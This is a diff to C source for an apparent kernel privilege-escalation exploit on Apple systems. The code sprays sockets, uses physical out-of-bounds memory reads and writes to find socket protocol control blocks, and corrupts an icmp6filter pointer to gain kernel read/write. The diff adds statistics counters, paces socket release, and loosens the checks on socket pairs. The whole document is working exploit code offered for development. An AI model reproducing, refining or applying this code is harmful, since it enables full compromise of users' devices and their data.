@@ -15,6 +15,33 @@
 #include "phys_oob.h"
 #include "utils.h"
 
+#define SOCKET_RELEASE_PACE 512
+
+typedef struct socket_scan_stats {
+    uint64_t scans;
+    uint64_t read_failures;
+    uint64_t pcb_pages;
+    uint64_t owned_pcbs;
+    uint64_t foreign_pcbs;
+    uint64_t duplicate_pcbs;
+    uint64_t rejected_linkage;
+    uint64_t rejected_pair;
+    uint64_t rejected_filter;
+    uint64_t forge_attempts;
+} socket_scan_stats_t;
+
+static socket_scan_stats_t g_scan_stats;
+
+void socket_scan_stats_reset(void) {
+    memset(&g_scan_stats, 0, sizeof(g_scan_stats));
+}
+
+void socket_scan_stats_log(void) {
+    LOG("pe_v3 PCB scans=%llu read_fail=%llu pages=%llu ours=%llu foreign=%llu duplicate=%llu reject_link=%llu reject_pair=%llu reject_filter=%llu forge=%llu", g_scan_stats.scans,
+        g_scan_stats.read_failures, g_scan_stats.pcb_pages, g_scan_stats.owned_pcbs, g_scan_stats.foreign_pcbs, g_scan_stats.duplicate_pcbs, g_scan_stats.rejected_linkage,
+        g_scan_stats.rejected_pair, g_scan_stats.rejected_filter, g_scan_stats.forge_attempts);
+}
+
 static bool is_kernel_heap_pointer(uint64_t value) {
     uint64_t band = value >> 32;
     return band >= 0xffffffc0ULL && band <= 0xffffffefULL && (value & 0xf) == 0;
@@ -34,7 +61,7 @@ static bool restore_candidate(mach_port_t memory_object, mach_vm_offset_t seekin
         if (physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, (uint8_t*)original) != KERN_SUCCESS) continue;
         if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, scratch) == KERN_SUCCESS && page_diff(scratch, original) <= 8 &&
             memcmp(scratch + control_offset + filter_offset, original + control_offset + filter_offset, EARLY_KRW_LENGTH) == 0 &&
-            memcmp(scratch + rw_offset + filter_offset, original + rw_offset + filter_offset, EARLY_KRW_LENGTH) == 0) {
+            (rw_offset == SIZE_MAX || memcmp(scratch + rw_offset + filter_offset, original + rw_offset + filter_offset, EARLY_KRW_LENGTH) == 0)) {
             return true;
         }
     }
@@ -142,7 +169,8 @@ uint64_t spray_socket(void) {
 
 void sockets_release(void) {
     for (size_t i = 0; i < g_ctx.socket_ports_count; i++) {
-        mach_port_deallocate(mach_task_self(), g_ctx.socket_ports[i]);
+        if (g_ctx.socket_ports[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), g_ctx.socket_ports[i]);
+        if ((i + 1) % SOCKET_RELEASE_PACE == 0) usleep(1000);
     }
     g_ctx.socket_ports_count = 0;
 }
@@ -152,8 +180,12 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     if (g_ctx.socket_ports_count < 2) return KERN_FAILURE;
     if (do_read) {
         kern_return_t kr = physical_oob_read_mo_with_retry(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
-        if (kr != KERN_SUCCESS) return kr;
+        if (kr != KERN_SUCCESS) {
+            g_scan_stats.read_failures++;
+            return kr;
+        }
     }
+    g_scan_stats.scans++;
 
     uint64_t search_start_idx = 0;
     bool target_found = false;
@@ -187,6 +219,7 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     if (!target_found) {
         return KERN_FAILURE;
     }
+    g_scan_stats.pcb_pages++;
 
     LOG("pcb_start_offset: %#llx", pcb_start_offset);
     uint64_t target_inp_gencnt = 0;
@@ -211,15 +244,18 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     }
     // the pcb we found isn't ours
     if (!is_our_pcb) {
+        g_scan_stats.foreign_pcbs++;
         LOG("found freed PCB page");
         return KERN_FAILURE;
     }
+    g_scan_stats.owned_pcbs++;
 
     if (control_socket_idx + 1 >= g_ctx.socket_ports_count) return KERN_FAILURE;
 
     // we already found this one
     for (size_t i = 0; i < *target_inp_gencnt_count; i++) {
         if (target_inp_gencnt_list[i] == target_inp_gencnt) {
+            g_scan_stats.duplicate_pcbs++;
             LOG("found old PCB page");
             return KERN_FAILURE;
         }
@@ -247,6 +283,7 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     uint64_t list_next = *(uint64_t*)(read_buffer + pcb_start_offset + 0x20);
     uint64_t list_prev = *(uint64_t*)(read_buffer + pcb_start_offset + 0x28);
     if (!((list_next == 0 || krw_is_kernel_address(list_next)) && krw_is_kernel_address(list_prev) && is_kernel_heap_pointer(inp_list_next_pointer))) {
+        g_scan_stats.rejected_linkage++;
         LOG("rejecting invalid inpcb linkage");
         return KERN_FAILURE;
     }
@@ -267,24 +304,28 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
         }
         if (gencnt == rw_gencnt) rw_slot_offset = offset;
     }
-    if (signed_slots < 2 || rw_slot_offset == SIZE_MAX) {
-        LOG("rejecting uncorroborated socket pair");
+    if (signed_slots < 2) {
+        g_scan_stats.rejected_pair++;
+        LOG("rejecting uncorroborated PCB page");
         return KERN_FAILURE;
     }
 
-    uint64_t control_socket_pcb = *(uint64_t*)(read_buffer + rw_slot_offset + offsets.inpcb_inp_list_le_next);
-    uint64_t expected_control_socket_pcb = inp_list_next_pointer - rw_slot_offset + pcb_start_offset;
-    if (!is_kernel_heap_pointer(control_socket_pcb) || control_socket_pcb != expected_control_socket_pcb) {
-        LOG("rejecting inconsistent socket pair linkage");
-        return KERN_FAILURE;
+    uint64_t control_socket_pcb = 0;
+    if (rw_slot_offset != SIZE_MAX) {
+        control_socket_pcb = *(uint64_t*)(read_buffer + rw_slot_offset + offsets.inpcb_inp_list_le_next);
+        uint64_t expected_control_socket_pcb = inp_list_next_pointer - rw_slot_offset + pcb_start_offset;
+        if (!is_kernel_heap_pointer(control_socket_pcb) || control_socket_pcb != expected_control_socket_pcb) {
+            g_scan_stats.rejected_pair++;
+            LOG("rejecting inconsistent socket pair linkage");
+            return KERN_FAILURE;
+        }
     }
 
-    uint8_t rw_snapshot[EARLY_KRW_LENGTH];
     uint8_t original_page[0xf00];
     uint64_t control_filter = *(uint64_t*)(read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt);
-    memcpy(rw_snapshot, read_buffer + rw_slot_offset + offsets.inpcb_icmp6filt, sizeof(rw_snapshot));
-    if (!krw_is_kernel_address(control_filter) || !krw_is_kernel_address(*(uint64_t*)rw_snapshot)) {
-        LOG("rejecting invalid filter snapshots");
+    if (!krw_is_kernel_address(control_filter)) {
+        g_scan_stats.rejected_filter++;
+        LOG("rejecting invalid control filter");
         return KERN_FAILURE;
     }
     memcpy(original_page, read_buffer, g_ctx.oob_size);
@@ -294,6 +335,7 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     *(uint64_t*)((uint8_t*)write_buffer + pcb_start_offset + offsets.inpcb_icmp6filt + 8) = 0;
 
     LOG("corrupting icmp6filter pointer...");
+    g_scan_stats.forge_attempts++;
     bool corrupted = false;
     for (unsigned attempt = 0; attempt < 8; attempt++) {
         if (physical_oob_write_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, write_buffer) != KERN_SUCCESS) {
@@ -334,7 +376,7 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     socklen_t getsockopt_read_length = EARLY_KRW_LENGTH;
     uint8_t readback[EARLY_KRW_LENGTH] = {};
     int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, readback, &getsockopt_read_length);
-    if (res != 0 || getsockopt_read_length < EARLY_KRW_LENGTH || memcmp(readback, rw_snapshot, EARLY_KRW_LENGTH) != 0) {
+    if (res != 0 || getsockopt_read_length < EARLY_KRW_LENGTH || !krw_is_kernel_address(*(uint64_t*)readback) || *(uint64_t*)(readback + sizeof(uint64_t)) != corrupted_filter_marker) {
         LOG_ERR("control filter readback mismatch");
         if (restore_candidate(memory_object, seeking_offset, original_page, read_buffer, pcb_start_offset, rw_slot_offset)) close(sock);
         return KERN_FAILURE;
@@ -351,7 +393,7 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     g_ctx.rw_socket = rw_sock;
     g_ctx.control_socket_pcb = control_socket_pcb;
     g_ctx.rw_socket_pcb = inp_list_next_pointer;
-    memcpy(g_ctx.rw_filter_snapshot, rw_snapshot, sizeof(rw_snapshot));
+    memcpy(g_ctx.rw_filter_snapshot, readback, sizeof(readback));
     g_ctx.filter_snapshots_valid = true;
     return KERN_SUCCESS;
 }
